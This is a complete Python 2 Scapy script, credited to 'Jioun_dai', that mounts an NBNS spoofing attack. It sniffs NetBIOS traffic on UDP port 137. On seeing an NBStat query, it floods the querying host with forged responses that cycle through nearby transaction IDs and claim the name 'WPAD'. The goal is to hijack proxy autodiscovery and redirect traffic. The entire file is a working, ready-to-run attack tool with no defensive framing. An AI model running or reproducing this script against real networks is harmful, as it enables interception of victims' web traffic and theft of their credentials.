#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os, sys
import struct
import time
from scapy.all import *

__author__ = "Jioun_dai"

TRANSACTION_ID_RANGE = 100
RR_name = "WPAD"
host_ip = ""

def CraftNBNSResp(src, dst, sport, dport, tid, name):
    NBNS_resp = NBNSQueryResponse()
    NBNS_resp.NAME_TRN_ID = tid
    NBNS_resp.FLAGS = 0x8500
    NBNS_resp.QDCOUNT = 0
    NBNS_resp.ANCOUNT = 1
    NBNS_resp.NSCOUNT = 0
    NBNS_resp.ARCOUNT = 0
    NBNS_resp.RR_NAME = RR_name
    NBNS_resp.QUESTION_TYPE = 0x0020
    NBNS_resp.QUESTION_CLASS = 0x0001
    NBNS_resp.NB_FLAGS = 0
    NBNS_resp.NB_ADDRESS = dst
    send(IP(dst = src)/UDP(sport=dport, dport = sport)/NBNS_resp, verbose=False)

def ParseNBNS(NBNS_query_request):
    transID = NBNS_query_request.NAME_TRN_ID
    flags = NBNS_query_request.FLAGS
    QName = NBNS_query_request.QUESTION_NAME
    QType = NBNS_query_request.QUESTION_TYPE

    # print '[*] NBNS name: %s' % QName
    if QType == 0x20:
        print '[*] Type: NB'
    elif QType == 0x21:
        print '[*] Type: NBStat'
        print "[*] Transaction ID: %s" % hex(transID)
        return (transID, QName)

    return (0, QName)

def ParsePtk(pkt):
    global host_ip
    src=pkt[IP].src
    if src == host_ip:# just need request
        return

    dst = pkt[IP].dst
    if host_ip == "":
        host_ip = dst

    sport = pkt[UDP].sport
    dport = pkt[UDP].dport

    print '[*] NetBIOS request from %s:%d, dport: %d' % (src, sport, dport)
    NBNS_query_request = pkt[UDP].payload
    # hexdump(NBNS_query_request)
    transId, name = ParseNBNS(NBNS_query_request)
    if transId > 0: # got it
        print '[*] Start sending payload...'
        for tid in range(transId - TRANSACTION_ID_RANGE, transId + TRANSACTION_ID_RANGE):
            CraftNBNSResp(src, dst, sport, dport, tid, name)
            time.sleep(0.02)
        print '[*] Send payload finished.'


def Sniff(iface):
    print "[*]start sniff packet."
    sniff(iface = iface, filter = "udp and port 137", prn=ParsePtk)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print 'Usage: ./%s interface' % sys.argv[0]
        sys.exit(0)
    Sniff(sys.argv[1])